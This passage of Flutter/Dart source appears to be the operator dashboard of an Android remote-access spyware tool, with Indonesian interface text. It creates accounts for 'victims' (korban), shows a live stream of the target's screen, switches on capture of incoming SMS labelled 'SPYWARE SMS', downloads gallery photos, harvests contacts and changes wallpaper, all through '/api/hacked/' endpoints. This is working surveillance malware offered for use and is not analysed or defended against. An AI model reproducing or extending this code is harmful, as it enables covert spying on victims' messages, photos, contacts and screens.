                decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(4), border: Border.all(color: color.withOpacity(0.6))),
                child: Text('ON', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: color, fontWeight: FontWeight.bold, letterSpacing: 1)))
            else if (isGps && _fetchingGps)
              SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: color, strokeWidth: 2))
            else if (isAudio && (_recordingAudio || _fetchingAudio))
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(4), border: Border.all(color: color.withOpacity(0.6))),
                child: Text(_recordingAudio ? 'REC' : '...',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: color, fontWeight: FontWeight.bold, letterSpacing: 1)))
            else
              const SizedBox.shrink(),
          ]),
          const Spacer(),
          Text(cmd['title'] as String,
            style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold,
              color: isActive ? Colors.white : Colors.white.withOpacity(0.35), letterSpacing: 0.5)),
        ]),
      ),
    );
  }

  
  Widget _buildPsknmrcTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          SvgPicture.string(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
            width: 14, height: 14,
            colorFilter: const ColorFilter.mode(Color(0xFFA78BFA), BlendMode.srcIn)),
          const SizedBox(width: 8),
          const Text('USERNAME', style: TextStyle(
            fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.w700,
            color: Color(0xFFA78BFA), letterSpacing: 2.5)),
        ]),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
          child: TextField(
            controller: _psknmrcUsernameCtrl,
            style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 14),
            decoration: InputDecoration(
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              hintText: 'Masukkan Username Untuk Korban...',
              hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4), fontSize: 11, fontFamily: 'ShareTechMono')),
          ),
        ),
        const SizedBox(height: 16),
        SizedBox(
          width: double.infinity,
          child: GestureDetector(
            onTap: _creatingPsknmrc ? null : _createPsknmrcUser,
            child: Container(
              padding: const EdgeInsets.symmetric(vertical: 16),
              decoration: BoxDecoration(
                gradient: _creatingPsknmrc
                  ? LinearGradient(colors: [_purple.withOpacity(0.4), const Color(0xFF6D28D9).withOpacity(0.4)])
                  : const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]),
                borderRadius: BorderRadius.circular(14)),
              child: Center(child: _creatingPsknmrc
                ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                : const Text('BUAT USERNAME', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1.5))),
            ),
          ),
        ),
        const SizedBox(height: 60),
      ]),
    );
  }

  Future<void> _createPsknmrcUser() async {
    final username = _psknmrcUsernameCtrl.text.trim();
    if (username.isEmpty) { showWarning(context, 'Username Tidak Boleh Kosong'); return; }
    setState(() { _creatingPsknmrc = true; });
    try {
      final res = await ApiService.post('/api/create/psknmrc', {'username': username, 'password': 'psknmrc_${username}_auto'});
      if (res['success'] == true) {
        _psknmrcUsernameCtrl.clear();
        if (mounted) showSuccess(context, 'Akun korban "$username" berhasil dibuat!');
      } else {
        if (mounted) showError(context, res['message'] as String? ?? 'Gagal Membuat Akun');
      }
    } catch (e) {
      if (mounted) showError(context, 'Error: $e');
    }
    if (mounted) setState(() => _creatingPsknmrc = false);
  }
}

class _ScreenLiveViewer extends StatefulWidget {
  final String? Function() getFrame;
  final int Function() getWidth;
  final int Function() getHeight;
  final int Function() getFrameId;
  final bool Function() isActive;
  final VoidCallback onStop;
  const _ScreenLiveViewer({
    required this.getFrame,
    required this.getWidth,
    required this.getHeight,
    required this.getFrameId,
    required this.isActive,
    required this.onStop,
  });
  @override
  State<_ScreenLiveViewer> createState() => _ScreenLiveViewerState();
}

class _ScreenLiveViewerState extends State<_ScreenLiveViewer> {
  Timer?  _refreshTimer;
  String? _frame;
  int     _lastFrameId = -1;

  @override
  void initState() {
    super.initState();
    
    _refreshTimer = Timer.periodic(const Duration(milliseconds: 80), (_) {
      final fid = widget.getFrameId();
      if (fid > _lastFrameId && mounted) {
        _lastFrameId = fid;
        setState(() => _frame = widget.getFrame());
      }
    });
  }

  @override
  void dispose() { _refreshTimer?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final frameB64 = _frame;
    final w = widget.getWidth();
    final h = widget.getHeight();
    final ratio = (w > 0 && h > 0) ? w / h : 9 / 16;
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black, elevation: 0,
        leading: GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(margin: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              border: Border.all(color: const Color(0xFF10B981).withOpacity(0.4)),
              borderRadius: BorderRadius.circular(10)),
            child: SvgPicture.string(AppSvgIcons.arrowBackIos, width: 16, height: 16, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn)))),
        title: Row(children: [
          Container(width: 8, height: 8,
            decoration: const BoxDecoration(
              shape: BoxShape.circle,
              color: Color(0xFF10B981),
              boxShadow: [BoxShadow(color: Color(0xFF10B981), blurRadius: 6)])),
          const SizedBox(width: 8),
          const Text('SCREEN LIVE',
            style: TextStyle(fontFamily: 'Orbitron', fontSize: 13,
              fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 2)),
        ]),
        actions: [
          GestureDetector(
            onTap: () { widget.onStop(); Navigator.pop(context); },
            child: Container(
              margin: const EdgeInsets.only(right: 12),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Colors.red.withOpacity(0.5))),
              child: const Text('STOP',
                style: TextStyle(fontFamily: 'Orbitron', fontSize: 10,
                  color: Colors.red, letterSpacing: 1, fontWeight: FontWeight.bold)))),
        ],
      ),
      body: Center(
        child: frameB64 == null
          ? Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              const SizedBox(width: 40, height: 40,
                child: CircularProgressIndicator(color: Color(0xFF10B981), strokeWidth: 2)),
              const SizedBox(height: 16),
              const Text('Menunggu Frame Dari Device...',
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white54)),
              const SizedBox(height: 6),
              const Text('Device Perlu Approve Izin Screen Capture',
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30)),
            ])
          : AspectRatio(
              aspectRatio: ratio,
              child: Image.memory(
                base64Decode(frameB64),
                fit: BoxFit.contain,
                gaplessPlayback: true,   
                errorBuilder: (_, __, ___) => const Center(
                  child: Text('Frame Error',
                    style: TextStyle(color: Colors.red, fontFamily: 'ShareTechMono'))))),
      ),
    );
  }
}

class _SmsSpySheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final bool smsSpyActive;
  final Future<void> Function(bool) onToggle;
  final Future<List<Map<String, dynamic>>> Function(String) onLoadMessages;
  final void Function(String, {bool isError}) onSnack;
  const _SmsSpySheet({
    required this.deviceId, required this.deviceName, required this.smsSpyActive,
    required this.onToggle, required this.onLoadMessages, required this.onSnack,
  });
  @override
  State<_SmsSpySheet> createState() => _SmsSpySheetState();
}

class _SmsSpySheetState extends State<_SmsSpySheet> {
  static const _red    = Color(0xFFEF4444);
  static const _purple = Color(0xFF8B5CF6);
  late bool _active;
  bool _toggling = false;
  String _tab = 'new'; 
  List<Map<String, dynamic>> _messages = [];
  bool _loading = false;

  @override
  void initState() {
    super.initState();
    _active = widget.smsSpyActive;
    _loadMessages();
  }

  Future<void> _loadMessages() async {
    setState(() => _loading = true);
    final msgs = await widget.onLoadMessages(_tab);
    if (mounted) setState(() { _messages = msgs; _loading = false; });
  }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _red.withOpacity(0.3))),
        child: Column(children: [
          
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4,
              decoration: BoxDecoration(color: _red.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 0),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _red.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _red.withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.message, width: 18, height: 18, colorFilter: const ColorFilter.mode(_red, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('SPYWARE SMS', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('Target: ${widget.deviceName}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _red)),
                ]),
                const Spacer(),
                
                _toggling
                  ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: _red, strokeWidth: 2))
                  : GestureDetector(
                      onTap: () async {
                        setState(() => _toggling = true);
                        await widget.onToggle(!_active);
                        if (mounted) setState(() { _active = !_active; _toggling = false; });
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: _active ? _red.withOpacity(0.2) : Colors.white.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: _active ? _red : Colors.white.withOpacity(0.2))),
                        child: Text(_active ? '🟢 ON' : '⚫ OFF',
                          style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _active ? _red : Colors.white54, letterSpacing: 1)))),
              ]),
              const SizedBox(height: 16),
              
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () { setState(() => _tab = 'new'); _loadMessages(); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _tab == 'new' ? _red.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: _tab == 'new' ? _red : Colors.white.withOpacity(0.1))),
                    child: const Center(child: Text('SMS BARU', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: Colors.white, letterSpacing: 1)))))),
                const SizedBox(width: 10),
                Expanded(child: GestureDetector(
                  onTap: () { setState(() => _tab = 'old'); _loadMessages(); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _tab == 'old' ? _purple.withOpacity(0.2) : Colors.transparent,
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: _tab == 'old' ? _purple : Colors.white.withOpacity(0.1))),
                    child: const Center(child: Text('SMS LAMA', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: Colors.white, letterSpacing: 1)))))),
              ]),
              const SizedBox(height: 8),
            ]),
          ),
          
          Expanded(
            child: _loading
              ? const Center(child: SizedBox(width: 28, height: 28, child: CircularProgressIndicator(color: _red, strokeWidth: 2)))
              : _messages.isEmpty
                ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    SvgPicture.string(AppSvgIcons.inbox, width: 48, height: 48, colorFilter: ColorFilter.mode(Colors.white.withOpacity(0.2), BlendMode.srcIn)),
                    const SizedBox(height: 12),
                    Text(_active ? 'Belum Ada Pesan Masuk' : 'Aktifkan Pantau Untuk Mulai Capture',
                      style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.3))),
                  ]))
                : ListView.builder(
                    controller: ctrl,
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: _messages.length,
                    itemBuilder: (_, i) {
                      final msg = _messages[i];
                      return Container(
                        margin: const EdgeInsets.only(bottom: 10),
                        padding: const EdgeInsets.all(14),
                        decoration: BoxDecoration(
                          color: const Color(0xFF071525),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _red.withOpacity(0.2))),
                        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                          Row(children: [
                            Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                              decoration: BoxDecoration(color: _red.withOpacity(0.15), borderRadius: BorderRadius.circular(4)),
                              child: Text(msg['appName'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: _red))),
                            const Spacer(),
                            Text(msg['time'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white.withOpacity(0.3))),
                          ]),
                          const SizedBox(height: 8),
                          Text(msg['sender'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 4),
                          Text(msg['content'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.6), height: 1.5)),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

class _GallerySheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String, {bool isError}) onSnack;
  const _GallerySheet({required this.deviceId, required this.deviceName, required this.onSnack});
  @override
  State<_GallerySheet> createState() => _GallerySheetState();
}

class _GallerySheetState extends State<_GallerySheet> {
  static const _cyan = Color(0xFF06B6D4);
  List<Map<String, dynamic>> _items = [];
  bool _loading = true;
  int _received = 0;
  Timer? _pollTimer;

  @override
  void initState() {
    super.initState();
    _startPolling();
  }

  void _startPolling() {
    _pollTimer = Timer.periodic(const Duration(seconds: 2), (_) async {
      try {
        final res = await ApiService.get('/api/hacked/gallery/${widget.deviceId}');
        if (res['success'] == true && mounted) {
          final newItems = List<Map<String, dynamic>>.from(res['photos'] ?? []);
          if (newItems.length > _items.length) {
            
            for (int i = _items.length; i < newItems.length; i++) {
              await Future.delayed(const Duration(milliseconds: 300));
              if (mounted) setState(() => _items.add(newItems[i]));
            }
          }
          if (res['done'] == true) { _pollTimer?.cancel(); if (mounted) setState(() => _loading = false); }
        }
      } catch (_) {}
    });
  }

  @override
  void dispose() { _pollTimer?.cancel(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _cyan.withOpacity(0.3))),
        child: Column(children: [
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _cyan.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 12),
            child: Row(children: [
              Container(width: 36, height: 36,
                decoration: BoxDecoration(color: _cyan.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _cyan.withOpacity(0.4))),
                child: Center(child: SvgPicture.string(AppSvgIcons.photoLibrary, width: 18, height: 18, colorFilter: const ColorFilter.mode(_cyan, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('VIEW GALLERY', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('${_items.length} foto${_loading ? " (loading...)" : ""}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _cyan)),
              ]),
              const Spacer(),
              if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _cyan, strokeWidth: 2)),
            ]),
          ),
          Expanded(
            child: _items.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 32, height: 32, child: CircularProgressIndicator(color: _cyan, strokeWidth: 2)),
                  const SizedBox(height: 14),
                  const Text('Mengambil Daftar Foto...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                ]))
              : GridView.builder(
                  controller: ctrl,
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 6, mainAxisSpacing: 6),
                  itemCount: _items.length,
                  itemBuilder: (_, i) {
                    final item = _items[i];
                    final thumb = item['thumbnailBase64'] as String?;
                    return Stack(children: [
                      GestureDetector(
                        onTap: () {
                          if (thumb != null && thumb.isNotEmpty) {
                            showDialog(
                              context: context,
                              builder: (_) => Dialog(
                                backgroundColor: Colors.black87,
                                insetPadding: EdgeInsets.zero,
                                child: Stack(children: [
                                  InteractiveViewer(
                                    minScale: 0.5, maxScale: 4.0,
                                    child: Image.memory(base64Decode(thumb), fit: BoxFit.contain,
                                      width: double.infinity, height: double.infinity)),
                                  Positioned(top: 12, right: 12,
                                    child: GestureDetector(
                                      onTap: () => Navigator.pop(context),
                                      child: Container(
                                        width: 32, height: 32,
                                        decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(16)),
                                        child: SvgPicture.string(AppSvgIcons.close, width: 18, height: 18, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn))))),
                                ]),
                              ),
                            );
                          }
                        },
                        child: Container(
                          decoration: BoxDecoration(
                            color: const Color(0xFF071525),
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(color: _cyan.withOpacity(0.2))),
                          child: thumb != null
                            ? ClipRRect(borderRadius: BorderRadius.circular(8),
                                child: Image.memory(base64Decode(thumb), fit: BoxFit.cover, width: double.infinity, height: double.infinity,
                                  errorBuilder: (_, __, ___) => SvgPicture.string(AppSvgIcons.brokenImage, width: 28, height: 28, colorFilter: const ColorFilter.mode(Colors.white24, BlendMode.srcIn))))
                            : Center(child: SvgPicture.string(AppSvgIcons.imageOutlined, width: 28, height: 28, colorFilter: const ColorFilter.mode(Colors.white24, BlendMode.srcIn)))),
                      ),
                      
                      if (thumb != null && thumb.isNotEmpty)
                        Positioned(
                          top: 4, left: 4,
                          child: Container(
                            width: 22, height: 22,
                            decoration: BoxDecoration(color: Colors.black45, borderRadius: BorderRadius.circular(4)),
                            child: SvgPicture.string(AppSvgIcons.zoomIn, width: 14, height: 14, colorFilter: const ColorFilter.mode(Colors.white70, BlendMode.srcIn)))),
                      
                      Positioned(
                        bottom: 4, right: 4,
                        child: GestureDetector(
                          onTap: () => _downloadPhoto(item),
                          child: Container(
                            width: 26, height: 26,
                            decoration: BoxDecoration(color: _cyan.withOpacity(0.9), borderRadius: BorderRadius.circular(6)),
                            child: SvgPicture.string(AppSvgIcons.downloadIcon, width: 16, height: 16, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn))))),
                    ]);
                  }),
          ),
        ]),
      ),
    );
  }

  void _downloadPhoto(Map<String, dynamic> item) async {
    try {
      final photoId = item['id']?.toString() ?? '';
      if (photoId.isEmpty) { widget.onSnack('ID Foto Tidak Valid', isError: true); return; }

      widget.onSnack('Mengambil Foto...');
      final res = await ApiService.get('/api/hacked/gallery/${widget.deviceId}/download?photoId=$photoId');
      if (res['success'] != true) {
        widget.onSnack('Gagal: ${res['message'] ?? 'unknown'}', isError: true); return;
      }

      String b64 = '';

      if (res['pendingFull'] == true) {
        
        widget.onSnack('Device Mengupload Foto Kualitas Full...');
        for (int i = 0; i < 20; i++) {
          await Future.delayed(const Duration(seconds: 2));
          try {
            final poll = await ApiService.get('/api/hacked/full-photo-result/${widget.deviceId}?photoId=$photoId');
            if (poll['success'] == true && (poll['imageBase64'] as String? ?? '').isNotEmpty) {
              b64 = poll['imageBase64'] as String;
              break;
            }
          } catch (_) {}
        }
      } else {
        
        final photo = res['photo'] as Map? ?? {};
        b64 = (photo['imageBase64'] as String?)?.isNotEmpty == true
            ? photo['imageBase64'] as String
            : (photo['thumbnailBase64'] as String? ?? '');
      }

      if (b64.isEmpty) { widget.onSnack('Foto Tidak Tersedia', isError: true); return; }
      if (!context.mounted) return;

      final bytes = base64Decode(b64);
      if (!context.mounted) return;

      showDialog(
        context: context,
        barrierColor: Colors.black87,
        builder: (dialogCtx) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(8),
          child: Stack(children: [
            ClipRRect(
              borderRadius: BorderRadius.circular(12),
              child: InteractiveViewer(
                minScale: 0.5, maxScale: 6.0,
                child: Image.memory(bytes, fit: BoxFit.contain,
                  gaplessPlayback: true,
                  errorBuilder: (_, __, ___) => Container(
                    height: 200,
                    color: Colors.black54,
                    child: const Center(child: Text('Gagal Load Foto', style: TextStyle(color: Colors.red, fontFamily: 'ShareTechMono'))))))),
            Positioned(top: 12, right: 12,
              child: GestureDetector(
                onTap: () => Navigator.pop(dialogCtx),
                child: Container(
                  width: 36, height: 36,
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.7),
                    borderRadius: BorderRadius.circular(18),
                    border: Border.all(color: Colors.white24)),
                  child: SvgPicture.string(AppSvgIcons.close, width: 20, height: 20, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn))))),
            Positioned(bottom: 12, left: 0, right: 0,
              child: Center(child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(20)),
                child: Text(item['name'] ?? '', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70))))),
          ]),
        ),
      );
    } catch (e) {
      widget.onSnack('Error download: $e', isError: true);
    }
  }
}

class _ContactsSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  const _ContactsSheet({required this.deviceId, required this.deviceName});
  @override
  State<_ContactsSheet> createState() => _ContactsSheetState();
}

class _ContactsSheetState extends State<_ContactsSheet> {
  static const _purple = Color(0xFF8B5CF6);
  List<Map<String, dynamic>> _contacts = [];
  bool _loading = true;
  String _search = '';
  final _searchCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _loadContacts();
  }

  void _loadContacts() {
    Timer.periodic(const Duration(seconds: 2), (t) async {
      try {
        final res = await ApiService.get('/api/hacked/contacts/${widget.deviceId}');
        if (res['success'] == true && mounted) {
          setState(() {
            _contacts = List<Map<String, dynamic>>.from(res['contacts'] ?? []);
            _loading = res['contacts'] == null || (res['contacts'] as List).isEmpty;
          });
          if (!_loading) t.cancel();
        }
      } catch (_) {}
    });
  }

  @override
  void dispose() { _searchCtrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final filtered = _contacts.where((c) {
      final name  = (c['name'] as String? ?? '').toLowerCase();
      final phone = (c['phone'] as String? ?? '').toLowerCase();
      return name.contains(_search.toLowerCase()) || phone.contains(_search.toLowerCase());
    }).toList();

    return DraggableScrollableSheet(
      initialChildSize: 0.85,
      maxChildSize: 0.95,
      minChildSize: 0.4,
      expand: false,
      builder: (_, ctrl) => Container(
        decoration: BoxDecoration(
          color: const Color(0xFF0D1F35),
          borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
          border: Border.all(color: _purple.withOpacity(0.3))),
        child: Column(children: [
          Padding(
            padding: const EdgeInsets.only(top: 12, bottom: 4),
            child: Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: _purple.withOpacity(0.3), borderRadius: BorderRadius.circular(2))))),
          Padding(
            padding: const EdgeInsets.fromLTRB(20, 12, 20, 0),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _purple.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.contacts, width: 18, height: 18, colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('LIST KONTAK', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text('${_contacts.length} kontak ditemukan', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _purple)),
                ]),
                const Spacer(),
                if (_loading) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)),
              ]),
              const SizedBox(height: 12),
              
              Container(
                decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.25))),
                child: TextField(
                  controller: _searchCtrl,
                  onChanged: (v) => setState(() => _search = v),
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 12),
                  decoration: InputDecoration(
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                    hintText: 'Cari Nama / Nomor...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontFamily: 'ShareTechMono', fontSize: 11),
                    prefixIcon: Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 12),
                      child: SvgPicture.string(AppSvgIcons.search, width: 16, height: 16, colorFilter: ColorFilter.mode(_purple.withOpacity(0.5), BlendMode.srcIn))),
                    prefixIconConstraints: const BoxConstraints(minWidth: 44, minHeight: 44)),
                ),
              ),
              const SizedBox(height: 8),
            ]),
          ),
          Expanded(
            child: _loading && _contacts.isEmpty
              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  const SizedBox(width: 32, height: 32, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)),
                  const SizedBox(height: 14),
                  const Text('Mengambil Kontak...', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white54)),
                ]))
              : filtered.isEmpty
                ? const Center(child: Text('Tidak Ada Hasil', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white30)))
                : ListView.builder(
                    controller: ctrl,
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    itemCount: filtered.length,
                    itemBuilder: (_, i) {
                      final c = filtered[i];
                      return Container(
                        margin: const EdgeInsets.only(bottom: 8),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                        decoration: BoxDecoration(color: const Color(0xFF071525), borderRadius: BorderRadius.circular(10), border: Border.all(color: _purple.withOpacity(0.15))),
                        child: Row(children: [
                          Container(width: 36, height: 36,
                            decoration: BoxDecoration(color: _purple.withOpacity(0.15), shape: BoxShape.circle),
                            child: Center(child: Text(
                              (c['name'] as String? ?? '?').substring(0, 1).toUpperCase(),
                              style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: _purple, fontWeight: FontWeight.bold)))),
                          const SizedBox(width: 12),
                          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                            Text(c['name'] as String? ?? 'Unknown', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
                            const SizedBox(height: 2),
                            Text(c['phone'] as String? ?? '-', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
                          ])),
                        ]),
                      );
                    }),
          ),
        ]),
      ),
    );
  }
}

class _WallpaperSheet extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final void Function(String) onSent;
  final void Function(String) onError;
  const _WallpaperSheet({required this.deviceId, required this.deviceName, required this.onSent, required this.onError});
  @override
  State<_WallpaperSheet> createState() => _WallpaperSheetState();
}

class _WallpaperSheetState extends State<_WallpaperSheet> {
  static const _purple = Color(0xFF8B5CF6);
  File? _pickedFile;
  String? _base64Image;
  String? _mimeType;
  bool _sending = false;

  Future<void> _pickImage(ImageSource source) async {
    final picker = ImagePicker();
    final xfile  = await picker.pickImage(source: source, imageQuality: 75, maxWidth: 1080, maxHeight: 1920);
    if (xfile == null) return;
    final file   = File(xfile.path);
    final bytes  = await file.readAsBytes();
    final ext    = xfile.path.split('.').last.toLowerCase();
    setState(() {
      _pickedFile  = file;
      _base64Image = base64Encode(bytes);
      _mimeType    = ext == 'png' ? 'image/png' : 'image/jpeg';
    });
  }

  Future<void> _send() async {
    if (_base64Image == null) return;
    setState(() => _sending = true);
    try {
      final res = await ApiService.post('/api/hacked/wallpaper', {
        'deviceId': widget.deviceId, 'imageBase64': _base64Image, 'mimeType': _mimeType ?? 'image/jpeg',
      });
      Navigator.pop(context);
      if (res['success'] == true) { widget.onSent(res['message'] ?? 'Wallpaper dikirim!'); }
      else { widget.onError(res['message'] ?? 'Gagal'); }
    } catch (e) { widget.onError('Error: $e'); }
